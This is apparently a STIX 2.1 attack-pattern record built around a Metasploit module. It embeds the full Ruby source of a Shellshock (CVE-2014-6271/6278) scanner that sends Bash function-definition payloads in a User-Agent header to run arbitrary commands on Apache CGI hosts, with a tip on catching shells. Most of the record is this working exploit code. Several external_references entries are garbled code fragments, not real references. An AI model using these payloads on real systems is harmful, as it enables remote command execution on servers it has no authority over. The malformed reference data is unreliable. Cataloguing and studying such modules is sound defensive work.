{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4aeaab88-09ce-4fac-86d5-99d39fa7f0d9",
    "created": "2024-08-14T16:29:48.383971Z",
    "modified": "2024-08-14T16:29:48.383975Z",
    "name": "Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner",
    "description": " This module scans for the Shellshock vulnerability, a flaw in how the Bash shell handles external environment variables. This module targets CGI scripts in the Apache web server by setting the HTTP_USER_AGENT environment variable to a malicious function definition.  PROTIP: Use exploit/multi/handler with a PAYLOAD appropriate to your CMD, set ExitOnSession false, run -j, and then run this module to create sessions on vulnerable hosts.  Note that this is not the recommended method for obtaining shells. If you require sessions, please use the apache_mod_cgi_bash_env_exec exploit module instead. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/apache_mod_cgi_bash_env.rb",
            "external_id": "apache_mod_cgi_bash_env.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6271"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6278"
        },
        {
            "source_name": "reference",
            "url": "https://access.redhat.com/articles/1200223"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2014/q3/649"
        },
        {
            "source_name": "CVE-2014-6271",
            "external_id": "CVE-2014-6278)"
        },
        {
            "source_name": "res=req(\"echo#{marker}\"",
            "external_id": "datastoreCVE)"
        },
        {
            "source_name": "res=req(datastoreCMD",
            "external_id": "datastoreCVE)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner',\n      'Description' => %q{\n        This module scans for the Shellshock vulnerability, a flaw in how the Bash shell\n        handles external environment variables. This module targets CGI scripts in the\n        Apache web server by setting the HTTP_USER_AGENT environment variable to a\n        malicious function definition.\n\n        PROTIP: Use exploit/multi/handler with a PAYLOAD appropriate to your\n        CMD, set ExitOnSession false, run -j, and then run this module to create\n        sessions on vulnerable hosts.\n\n        Note that this is not the recommended method for obtaining shells.\n        If you require sessions, please use the apache_mod_cgi_bash_env_exec\n        exploit module instead.\n      },\n      'Author' => [\n        'Stephane Chazelas', # Vulnerability discovery\n        'wvu', # Metasploit module\n        'lcamtuf' # CVE-2014-6278\n      ],\n      'References' => [\n        [ 'CVE', '2014-6271' ],\n        [ 'CVE', '2014-6278' ],\n        [ 'OSVDB', '112004' ],\n        [ 'EDB', '34765' ],\n        [ 'URL', 'https://access.redhat.com/articles/1200223' ],\n        [ 'URL', 'https://seclists.org/oss-sec/2014/q3/649' ]\n      ],\n      'DisclosureDate' => '2014-09-24',\n      'License' => MSF_LICENSE,\n      'Notes' => {'AKA' => ['Shellshock']}\n    ))\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Path to CGI script']),\n      OptString.new('METHOD', [true, 'HTTP method to use', 'GET']),\n      OptString.new('HEADER', [true, 'HTTP header to use', 'User-Agent']),\n      OptString.new('CMD', [true, 'Command to run (absolute paths required)',\n        '/usr/bin/id']),\n      OptEnum.new('CVE', [true, 'CVE to check/exploit', 'CVE-2014-6271',\n        ['CVE-2014-6271', 'CVE-2014-6278']])\n    ])\n  end\n\n  def check_host(ip)\n    res = req(\"echo #{marker}\", datastore['CVE'])\n\n    if res && res.body.include?(marker * 3)\n      report_vuln(\n        :host => ip,\n        :port => rport,\n        :name => self.name,\n        :refs => self.references\n      )\n      return Exploit::CheckCode::Vulnerable\n    elsif res && res.code == 500\n      injected_res_code = res.code\n    else\n      return Exploit::CheckCode::Safe\n    end\n\n    res = send_request_cgi({\n      'method' => datastore['METHOD'],\n      'uri' => normalize_uri(target_uri.path.to_s)\n    })\n\n    if res && injected_res_code == res.code\n      return Exploit::CheckCode::Unknown\n    elsif res && injected_res_code != res.code\n      return Exploit::CheckCode::Appears\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def run_host(ip)\n    return unless check_host(ip) == Exploit::CheckCode::Vulnerable\n\n    res = req(datastore['CMD'], datastore['CVE'])\n\n    if res && res.body =~ /#{marker}(.+)#{marker}/m\n      print_good(\"#{$1}\")\n      report_vuln(\n        :host => ip,\n        :port => rport,\n        :name => self.name,\n        :refs => self.references\n      )\n    end\n  end\n\n  def req(cmd, cve)\n    case cve\n    when 'CVE-2014-6271'\n      sploit = cve_2014_6271(cmd)\n    when 'CVE-2014-6278'\n      sploit = cve_2014_6278(cmd)\n    end\n\n    send_request_cgi(\n      'method' => datastore['METHOD'],\n      'uri' => normalize_uri(target_uri.path),\n      'headers' => {\n        datastore['HEADER'] => sploit\n      }\n    )\n  end\n\n  def cve_2014_6271(cmd)\n    %Q{() { :;};echo -e \"\\\\r\\\\n#{marker}$(#{cmd})#{marker}\"}\n  end\n\n  def cve_2014_6278(cmd)\n    %Q{() { _; } >_[$($())] { echo -e \"\\\\r\\\\n#{marker}$(#{cmd})#{marker}\"; }}\n  end\n\n  def marker\n    @marker ||= Rex::Text.rand_text_alphanumeric(rand(42) + 1)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-09-24"
}